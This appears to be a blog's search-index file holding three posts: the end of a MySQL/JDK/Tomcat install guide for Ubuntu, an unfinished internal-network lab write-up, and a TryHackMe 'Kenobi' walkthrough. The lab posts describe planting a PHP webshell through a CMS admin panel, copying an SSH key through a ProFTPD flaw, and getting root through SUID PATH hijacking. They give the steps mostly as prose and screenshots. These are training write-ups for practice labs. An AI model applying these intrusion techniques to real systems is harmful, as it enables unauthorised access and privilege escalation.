title="7.Ubuntu环境配置"></a>7.Ubuntu环境配置</h2><p>（虚拟机安装，换源什么的）</p><p>自己百度吧，这个没什么好说的(我装的是20.04)</p><h2 id="8-安装mysql"><a href="#8-安装mysql" class="headerlink" title="8.安装mysql"></a>8.安装mysql</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>downloads.mysql.com<span class="hljs-regexp">/archives/</span>community/<br></code></pre></td></tr></table></figure><p>1、下载Mysql的deb包<br>Ubuntu中需要已安装 Wget ，如果没有可运行如下命令： apt install -y wget 。<br>然后命令行键入下面这条命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dev.mysql.com/get/Downloads/MySQL-<span class="hljs-number">5</span>.<span class="hljs-number">7</span>/mysql-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<br><span class="hljs-attribute">1ubuntu18</span>.<span class="hljs-number">04</span>_amd64.deb-bundle.tar<br></code></pre></td></tr></table></figure><p>2、新建Mysql目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>3、将deb包挪到Mysql目录下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mv</span> mysql-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb-bundle.tar ./mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>4、解压deb包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br><span class="hljs-attribute">sudo</span> tar -vxf mysql-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb-bundle.tar ./mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>5、解压出来的deb安装包如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">libmysqlclient20_5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-client_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-source_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-common_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-testsuite_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">libmysqlclient</span>-dev_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-client_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">libmysqld</span>-dev_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-test_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br></code></pre></td></tr></table></figure><p>6、删除两个测试相关的包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> rm -f mysql-testsuite_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">sudo</span> rm -f mysql-community-test_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br></code></pre></td></tr></table></figure><p>7.安装相关依赖</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install libtinfo5<br>sudo apt-<span class="hljs-built_in">get</span> install libmecab2<br></code></pre></td></tr></table></figure><p>8、使用deb进行安装</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> dpkg -i mysql-<span class="hljs-regexp">*.deb</span><br></code></pre></td></tr></table></figure><p>此步骤会要求大家设置root账户密码，请注意。</p><p>9、测试是否成功安装<br>可在命令行中键入 mysql –version ，如果出现mysql版本，极为安装成功</p><h2 id="9-安装JDK1-8"><a href="#9-安装JDK1-8" class="headerlink" title="9.安装JDK1.8"></a>9.安装JDK1.8</h2><p>1、解压JDK到指定文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> /usr/lib/jvm<br>sudo tar -zxvf jdk-8u202-linux-x64.tar.gz -C /usr/lib/jvm<br></code></pre></td></tr></table></figure><p>2、解压完成后，配置环境变量，使用gedit打开 ~&#x2F;.bashrc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gedit ~/.bashrc<br></code></pre></td></tr></table></figure><p>3、并在上面文本的末尾添加以下内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#set oracle jdk environment</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">JAVA_HOME</span>=/usr/lib/jvm/jdk1.8.0_202 ## 这里要注意目录要换成自己解压的<br>jdk 目录<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">JRE_HOME</span>=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/jre<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">CLASSPATH</span>=.:$&#123;JAVA_HOME&#125;/lib:<span class="hljs-variable">$&#123;JRE_HOME&#125;</span>/lib<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:$PATH<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116333.png" alt="image-20240408232216954"></p><p>4、重启配置文件，使其生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p>5、测试JDK是否成功安装</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">java -<span class="hljs-built_in">version</span><br>javac -<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h2 id="10-安装Tomcat"><a href="#10-安装Tomcat" class="headerlink" title="10.安装Tomcat"></a>10.安装Tomcat</h2><p>Tomcat官方下载地址：</p><p><a href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a></p><p>注意：我们平常使用选择 Binary Distributions 即可，该版本是已编译好可直接使<br>用的程序。他下面的子类，我们选择 core版本 ，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116888.png" alt="image-20240408232615857"></p><p>下载完成后的Tomcat，进入 bin 目录选择对应启动文件即可启动。<br>Linux： startup.sh<br>Winodws： startup.bat<br>Linux启动成功如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116302.png" alt="image-20240408233000742"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网靶场-1 WP(未完)</title>
    <link href="/2024/06/13/%E9%9D%B6%E5%9C%BA-1%20WP/"/>
    <url>/2024/06/13/%E9%9D%B6%E5%9C%BA-1%20WP/</url>
    
    <content type="html"><![CDATA[<h1 id="内网靶场-1-WP"><a href="#内网靶场-1-WP" class="headerlink" title="内网靶场-1 WP"></a>内网靶场-1 WP</h1><p>连接上vpn，先对端口一顿扫</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132100266.png" alt="image-20240610202938674"></p><p>看到80，基本上是要访问web端，然后看到139，445基本就是永恒之蓝，1000+的不是很清楚，但3306肯定是数据库</p><p>这里不想这么多，开nmap进行详细扫的同时看看web端</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132100939.png" alt="image-20240610203300739"></p><p>php探针，下面也有mysql连接测试，root&#x2F;root直接成功了，这里再扫扫目录</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101124.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101196.png"></p><p>nmap的结果，msrpc不是很了解有什么用，但没关系，我们有mysql账号密码了，连进去看看</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101082.png"></p><p>进入phpmyadmin，phpmyadmin是有提权方式的，但我们还看到有个newyxcms，这里想试试yxcms能不能打，因为目录扫描没扫出来结果，这里我们自己fuzz一下试试</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101675.png"></p><p>发现yxcms就能直接访问</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101288.png"></p><p>我们也是直接在网页上看到了账号密码</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102887.png"></p><p>成功进入后台</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102246.png"></p><p>找到一个可以修改php代码的地方，直接写入php一句话木马</p><p><img src="/2024/06/13/%E9%9D%B6%E5%9C%BA-1%20WP/image-20240610204802400.png" alt="image-20240610204802400"></p><p>成功蚁剑连接</p><p>那我们也算是成功拿下</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102104.png"></p><p>cs启动</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102678.png"></p><p>提个权</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY1-kenobi</title>
    <link href="/2024/06/13/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/"/>
    <url>/2024/06/13/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY1-kenobi"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY1-kenobi" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY1-kenobi"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY1-kenobi</h1><p><a href="https://tryhackme.com/r/room/kenobi">TryHackMe的 |克诺比 — TryHackMe | Kenobi</a></p><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955513.png"></p><p>打开网页，我们先连上vpn</p><p>我们只需要打开终端输入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">openvpn <span class="hljs-tag">&lt;<span class="hljs-name">文件名</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后ping一下thm给出的ip</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955516.png"></p><p>ping的通即可（如下）</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955514.png"></p><p>然后就可以开始做题，一般来说这种打靶第一步就是先进行信息收集，然后信息收集第一步就是扫描端口</p><p>正如它给出的题目，使用nmap扫描机器来看开放了多少端口，nmap是渗透测试中常用的端口扫描工具</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955517.png"></p><p>我们可以通过百度来了解它的基本信息，这里就不多介绍，但我这次并不用nmap进行端口扫描，因为它扫描全端口需要较长的时间，而是采用rustscan，因为kali并不自带rustscan，这里再贴个安装教程</p><p><a href="https://blog.csdn.net/weixin_41657089/article/details/131800802">https://blog.csdn.net/weixin_41657089/article/details/131800802</a></p><p>我写这篇文章的时候国内docker因不可抗力原因都寄了，不知道以后会怎样，所以还是推荐装到自己kali上，也方便用</p><p>ok，开始扫描</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">rustscan</span> -a &lt;<span class="hljs-built_in">ip</span>&gt;<br></code></pre></td></tr></table></figure><p>就用这个指令就行，简单粗暴</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955518.png"></p><p>这里先简单分析下不同端口的意义</p><table><thead><tr><th>端口</th><th>作用</th></tr></thead><tbody><tr><td>21</td><td>ftp端口，通常用于文件传输</td></tr><tr><td>22</td><td>SSH端口，通常用于远程连接</td></tr><tr><td>80</td><td>HTTP端口，一般网页就在这个端口</td></tr><tr><td>139</td><td>TCP端口，用于访问局域网中共享文件或共享打印机</td></tr><tr><td>445</td><td>被文件和打印机共享服务使用</td></tr></tbody></table><p>更多的可以看下面两个</p><p><a href="https://cloud.tencent.com/developer/article/1897800%EF%BC%88%E5%BE%88%E5%85%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E5%A4%A7%E9%83%A8%E5%88%86%E4%B8%8D%E7%94%A8%E8%AE%B0%EF%BC%89">https://cloud.tencent.com/developer/article/1897800（很全，但是大部分不用记）</a></p><p><a href="https://blog.csdn.net/Geroge_Ming/article/details/109711897%EF%BC%88%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AE%B0%E4%B8%80%E4%B8%8B%EF%BC%89">https://blog.csdn.net/Geroge_Ming/article/details/109711897（常见端口及其服务，可以记一下）</a></p><p>一下就扫完了，我们再用nmap把详细信息扫出来，我通常用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nmap -p<span class="hljs-tag">&lt;<span class="hljs-name">扫出来的端口</span>&gt;</span> -A <span class="hljs-tag">&lt;<span class="hljs-name">ip</span>&gt;</span><br></code></pre></td></tr></table></figure><p>nmap中-A是一个指令，用于执行全面的扫描，因此我通常不去采用-sP，-sT什么的，基本都够用了</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955519.png"></p><p>至此task1基本完成</p><p>通过工具扫描端口并了解其基本信息</p><h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955520.png"></p><p>这是个比较基础的靶机，thm上也讲的比较清楚了，把红色的指令复制黏贴即可</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955521.png"></p><p>可以看到<strong>三个</strong>服务，其中应该能引起我们注意的就是中间那个anonymous，匿名</p><p>因为anonymous能够让我们也能够进行访问</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955522.png"></p><p>继续跟着教程走</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955491.png"></p><p>密码这里直接enter就行</p><p>可以看到log.txt,把它弄到我们的主机上</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955492.png"></p><p>继续照着教程来就行了，其实这里ftp在哪个端口运行前面已经有提到了</p><p>但我们还是要看看日志，因为里面可能还有别的内容</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955493.png"></p><p>这里也是直接enter就行</p><p>log.txt很长就不弄上来了，这里把关键信息截个图就算了</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955494.png"></p><p>这题问题的答案</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955495.png"></p><p>一个rsa的key，可能能帮我们进行ssh连接</p><p>差不多就这些，然后继续跟着教程走</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955496.png"></p><p>这个翻译不是很行，应该是挂载着什么东西，但没关系，继续照做</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955497.png"></p><p>这里应该就是有个var</p><p>到这里的步骤还是在做信息收集，但是相比起前面，我们收集了更多更详细的信息，帮助我们寻找突破口</p><h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955498.png"></p><p>还是跟着提示走就行了，task3的关键就是通过proftpd的一些漏洞来获取权限，先nc一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> &lt;ip&gt; <span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955499.png"></p><p>1.3.5</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955500.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955501.png"></p><p>4个</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955502.png"></p><p>两个不用回答的</p><p>老规矩照做</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955503.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955504.png"></p><p>还是照做</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955505.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955506.png"></p><p>可以看到这里有个id_rsa，把它弄到我们kali里就行</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955507.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955508.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955509.png"></p><p>这样就算是完成了</p><p>到这里，我们初步在目标机上占领据点，可以更深一步去进行攻击</p><h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><p>到这里的任务就是提权</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955483.png"></p><p>先了解这个知识点</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955485.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955486.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955487.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955488.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955512.png"></p><p><a href="https://img2022.cnblogs.com/blog/2857591/202210/2857591-20221013154847535-1543391356.png"><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955482.png"></a></p><p>观察上图可以得知：当我们执行&#x2F;usr&#x2F;bin&#x2F;menu 时，选择选项1其实是在执行一个<code>curl</code>命令，选择选项2其实是在执行<code>uname -r</code>命令。</p><p>这表明二进制文件curl和uname，是在没有完整路径的情况下运行的(例如没有使用&#x2F;usr&#x2F;bin&#x2F;curl 或&#x2F;usr&#x2F;bin&#x2F;uname运行文件)。</p><p>我们已经知道&#x2F;usr&#x2F;bin&#x2F;menu文件是一个SUID文件，它在执行时会暂时具有root 用户权限，我们可以尝试自定义创建一个curl文件（并写入&#x2F;bin&#x2F;bash，意思是打开一个bash shell），然后我们再给自定义的curl文件附加可执行权限（+x），接着将自定义的curl文件所在的路径添加到PATH变量中（这样能够保证我们自定义的curl文件能够被首先找到）。</p><p>完成以上操作之后，执行SUID文件&#x2F;usr&#x2F;bin&#x2F;menu，产生的效果是：以root权限打开一个bash shell—–这将获得root shell</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955490.png"></p><p>至此完成</p><p>如果有任何问题，欢迎到主页加我的vx交流学习，请注明来意</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
